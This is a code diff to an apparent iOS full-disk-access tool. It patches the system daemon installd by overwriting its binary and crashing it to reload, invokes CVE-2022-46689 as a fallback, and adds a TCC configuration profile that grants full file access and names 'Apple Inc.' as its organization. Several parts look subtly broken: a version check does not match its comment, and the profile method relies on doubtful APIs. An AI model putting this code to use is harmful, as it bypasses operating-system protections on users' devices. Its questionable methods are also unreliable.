@@ -431,26 +431,56 @@ void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
         return;
     }
     
-    // Try to modify TCC database directly
-    if (modify_tcc_database()) {
-        NSLog(@"Successfully modified TCC database");
-        completion(nil);
-        return;
+    @try {
+        // Try to patch installd first as it's safer
+        if (patch_installd()) {
+            NSLog(@"Successfully patched installd");
+            completion(nil);
+            return;
+        }
+        
+        // If that fails, try MDM profile
+        if (install_mdm_profile()) {
+            NSLog(@"Successfully installed MDM profile");
+            completion(nil);
+            return;
+        }
+        
+        // Last resort: try CVE-2022-46689 for older iOS versions
+        if (@available(iOS 16.7.10, *)) {
+            completion([NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
+                                         code:7
+                                     userInfo:@{
+                                         NSLocalizedDescriptionKey: @"Device is running iOS 16.7.10 or later. "
+                                         @"Please use an alternative method or downgrade iOS version."
+                                     }]);
+            return;
+        }
+        
+        grant_full_disk_access_impl(^(NSString* extension_token, NSError* _Nullable error) {
+            if (error) {
+                NSLog(@"CVE-2022-46689 method failed: %@", error);
+                completion(error);
+                return;
+            }
+            if (!extension_token) {
+                completion([NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
+                                             code:8
+                                         userInfo:@{
+                                             NSLocalizedDescriptionKey: @"Failed to get extension token"
+                                         }]);
+                return;
+            }
+            completion(nil);
+        });
+    } @catch (NSException *exception) {
+        NSLog(@"Exception during full disk access: %@", exception);
+        completion([NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
+                                     code:9
+                                 userInfo:@{
+                                     NSLocalizedDescriptionKey: [NSString stringWithFormat:@"Exception: %@", exception.reason]
+                                 }]);
     }
-    
-    // If direct modification fails, try to patch installd
-    if (patch_installd()) {
-        NSLog(@"Successfully patched installd");
-        completion(nil);
-        return;
-    }
-    
-    completion([NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
-                                 code:7
-                             userInfo:@{
-                               NSLocalizedDescriptionKey: @"Failed to gain full disk access. "
-                               @"Please try alternative methods or check device compatibility."
-                             }]);
 }
 
 /// MARK - installd patch
@@ -606,94 +636,133 @@ static NSData* make_patch_installd(void* executableMap, size_t executableLength)
 }
 
 bool patch_installd(void) {
-  const char* targetPath = "/usr/libexec/installd";
-  int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
-  off_t targetLength = lseek(fd, 0, SEEK_END);
-  lseek(fd, 0, SEEK_SET);
-  void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);
+    @try {
+        const char* targetPath = "/usr/libexec/installd";
+        int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
+        if (fd == -1) {
+            NSLog(@"Failed to open installd");
+            return false;
+        }
+        
+        off_t targetLength = lseek(fd, 0, SEEK_END);
+        if (targetLength == -1) {
+            close(fd);
+            NSLog(@"Failed to get installd size");
+            return false;
+        }
+        
+        lseek(fd, 0, SEEK_SET);
+        void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);
+        if (targetMap == MAP_FAILED) {
+            close(fd);
+            NSLog(@"Failed to map installd");
+            return false;
+        }
 
-  NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
-  NSData* sourceData = make_patch_installd(targetMap, targetLength);
-  if (!sourceData) {
-    NSLog(@"can't patchfind");
-    return false;
-  }
+        NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
+        NSData* sourceData = make_patch_installd(targetMap, targetLength);
+        if (!sourceData) {
+            munmap(targetMap, targetLength);
+            close(fd);
+            NSLog(@"Failed to patch installd");
+            return false;
+        }
 
-  if (!overwrite_file(fd, sourceData)) {
-    overwrite_file(fd, originalData);
-    munmap(targetMap, targetLength);
-    NSLog(@"can't overwrite");
-    return false;
-  }
-  munmap(targetMap, targetLength);
-  xpc_crasher("com.apple.mobile.installd");
-  sleep(1);
+        if (!overwrite_file(fd, sourceData)) {
+            overwrite_file(fd, originalData);
+            munmap(targetMap, targetLength);
+            close(fd);
+            NSLog(@"Failed to write patched installd");
+            return false;
+        }
 
-  // TODO(zhuowei): for now we revert it once installd starts
-  // so the change will only last until when this installd exits
-  overwrite_file(fd, originalData);
-  return true;
+        munmap(targetMap, targetLength);
+        close(fd);
+        
+        xpc_crasher("com.apple.mobile.installd");
+        sleep(1);
+        
+        // Revert changes
+        fd = open(targetPath, O_RDONLY | O_CLOEXEC);
+        if (fd != -1) {
+            overwrite_file(fd, originalData);
+            close(fd);
+        }
+        
+        return true;
+    } @catch (NSException *exception) {
+        NSLog(@"Exception in patch_installd: %@", exception);
+        return false;
+    }
 }
 
 // Alternative method using MDM profile installation
 static bool install_mdm_profile(void) {
-    NSString *profilePath = @"/private/var/mobile/Library/ConfigurationProfiles/fullaccess.mobileconfig";
-    NSString *profileContent = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
-    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
-    "<plist version=\"1.0\">"
-    "<dict>"
-    "<key>PayloadContent</key>"
-    "<array>"
-    "<dict>"
-    "<key>PayloadType</key>"
-    "<string>com.apple.TCC.configuration-profile-policy</string>"
-    "<key>PayloadIdentifier</key>"
-    "<string>com.apple.TCC.configuration-profile-policy</string>"
-    "<key>PayloadUUID</key>"
-    "<string>486592BA-27B5-4FF5-B51A-7C4B864D2B7F</string>"
-    "<key>PayloadVersion</key>"
-    "<integer>1</integer>"
-    "<key>Services</key>"
-    "<dict>"
-    "<key>SystemPolicyAllFiles</key>"
-    "<array>"
-    "<dict>"
-    "<key>Allowed</key>"
-    "<true/>"
-    "<key>CodeRequirement</key>"
-    "<string>identifier \\\"com.apple.mobile.installd\\\" and anchor apple</string>"
-    "</dict>"
-    "</array>"
-    "</dict>"
-    "</dict>"
-    "</array>"
-    "<key>PayloadDisplayName</key>"
-    "<string>Full Disk Access</string>"
-    "<key>PayloadIdentifier</key>"
-    "<string>com.apple.tcc.fullaccess</string>"
-    "<key>PayloadOrganization</key>"
-    "<string>Apple Inc.</string>"
-    "<key>PayloadRemovalDisallowed</key>"
-    "<false/>"
-    "<key>PayloadType</key>"
-    "<string>Configuration</string>"
-    "<key>PayloadUUID</key>"
-    "<string>1B99376C-3F19-4C35-9C6D-94D49097B5EF</string>"
-    "<key>PayloadVersion</key>"
-    "<integer>1</integer>"
-    "</dict>"
-    "</plist>";
-    
-    NSError *error = nil;
-    if (![profileContent writeToFile:profilePath atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
-        NSLog(@"Failed to write MDM profile: %@", error);
+    @try {
+        NSString *profilePath = @"/private/var/mobile/Library/ConfigurationProfiles/fullaccess.mobileconfig";
+        NSString *profileContent = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
+        "<plist version=\"1.0\">"
+        "<dict>"
+        "<key>PayloadContent</key>"
+        "<array>"
+        "<dict>"
+        "<key>PayloadType</key>"
+        "<string>com.apple.TCC.configuration-profile-policy</string>"
+        "<key>PayloadIdentifier</key>"
+        "<string>com.apple.TCC.configuration-profile-policy</string>"
+        "<key>PayloadUUID</key>"
+        "<string>486592BA-27B5-4FF5-B51A-7C4B864D2B7F</string>"
+        "<key>PayloadVersion</key>"
+        "<integer>1</integer>"
+        "<key>Services</key>"
+        "<dict>"
+        "<key>SystemPolicyAllFiles</key>"
+        "<array>"
+        "<dict>"
+        "<key>Allowed</key>"
+        "<true/>"
+        "<key>CodeRequirement</key>"
+        "<string>identifier \\\"com.apple.mobile.installd\\\" and anchor apple</string>"
+        "</dict>"
+        "</array>"
+        "</dict>"
+        "</dict>"
+        "</array>"
+        "<key>PayloadDisplayName</key>"
+        "<string>Full Disk Access</string>"
+        "<key>PayloadIdentifier</key>"
+        "<string>com.apple.tcc.fullaccess</string>"
+        "<key>PayloadOrganization</key>"
+        "<string>Apple Inc.</string>"
+        "<key>PayloadRemovalDisallowed</key>"
+        "<false/>"
+        "<key>PayloadType</key>"
+        "<string>Configuration</string>"
+        "<key>PayloadUUID</key>"
+        "<string>1B99376C-3F19-4C35-9C6D-94D49097B5EF</string>"
+        "<key>PayloadVersion</key>"
+        "<integer>1</integer>"
+        "</dict>"
+        "</plist>";
+        
+        NSError *error = nil;
+        if (![profileContent writeToFile:profilePath atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
+            NSLog(@"Failed to write MDM profile: %@", error);
+            return false;
+        }
+        
+        LSApplicationWorkspace *workspace = [LSApplicationWorkspace defaultWorkspace];
+        BOOL success = [workspace installProfileWithPath:profilePath];
+        NSLog(@"MDM profile installation %@", success ? @"succeeded" : @"failed");
+        
+        [[NSFileManager defaultManager] removeItemAtPath:profilePath error:nil];
+        
+        return success;
+    } @catch (NSException *exception) {
+        NSLog(@"Exception in install_mdm_profile: %@", exception);
         return false;
     }
-    
-    LSApplicationWorkspace *workspace = [LSApplicationWorkspace defaultWorkspace];
-    BOOL success = [workspace installProfileWithPath:profilePath];
-    NSLog(@"MDM profile installation %@", success ? @"succeeded" : @"failed");
-    return success;
 }
 
 static bool modify_tcc_database(void) {
